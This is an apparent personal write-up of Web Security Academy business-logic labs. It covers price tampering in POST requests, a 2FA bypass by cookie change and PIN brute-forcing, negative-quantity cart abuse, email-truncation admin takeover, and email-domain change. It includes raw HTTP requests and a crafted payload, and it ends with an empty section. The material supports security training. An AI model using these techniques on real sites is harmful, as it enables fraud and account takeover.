# Title: Business Logic vulnerability's , *Web Academy*
- 👨‍💻By: Nathan Hailu
- 🗒Description: Labs are solved and their write up is here.
- 📅Date:  Fri 12/16/2022

================= { START } ==============================
A) Excessive trust in client-side controls
    When you order a products sites might include the amount of money inside the header as the following.
        POST /cart HTTP/1.1
        Host: 0a7600820378f9bac391207200d40016.web-security-academy.net
        Cookie: session=Ob6eiiqmMCuwttVCCRjagQEsg1US9tzR
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
        Connection: close

        productId=1&redir=PRODUCT&quantity=1&price=133700

        > Here we test the site by changing the price value to other and test if it works

B) 2FA broken logic
    Still looking into the header you can see that the site is validating the user by a cookie name called verify so changing the value there and trying to bruteforce the pin you can bypass it
        POST /login2 HTTP/1.1
        Host: 0aff00e303b87fdcc03c27c100a000fb.web-security-academy.net
        Cookie: session=liecaxPnaznrk54MItecLSRlMcNsz1g0; verify=carlos
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
        Connection: close

        mfa-code=1829

C) High-level logic vulnerability
    The website do client side validations, it check the price of a cart with client side javascript this can be manipulated by using some negative integers with the quantity of a product so i can buy $1339 price product by adding -15 quantity of $86 product when they are added the total price will be minimum and might be equal with the money we have in our stock.

D) Inconsistent handling of exceptional input
    This site displays 256 characters on the email field so, if i added 256 character with an admin email and extra {dot normal email} on the registration, then i can have the admin email displayed and the normal will be cut out. This helps to accept verification emails with my normal email, and have admin access with the admin email.
    solution: 
    email:"hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1@dontwannacry.com.exploit-0a2100e904a468d2c061673a01a40020.exploit-server.net"  

    Displayed: "hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1@dontwannacry.com"
    So i can have admin account.

E) Inconsistent security controls
    This lab, doesnt have any flaw on the registration and login part. but you have "Update email" feature. The admins have @Dontwannacry.com domain on the email so, it i registered with normal and changed my email to this domain then i can exploit the site/lab.

F) 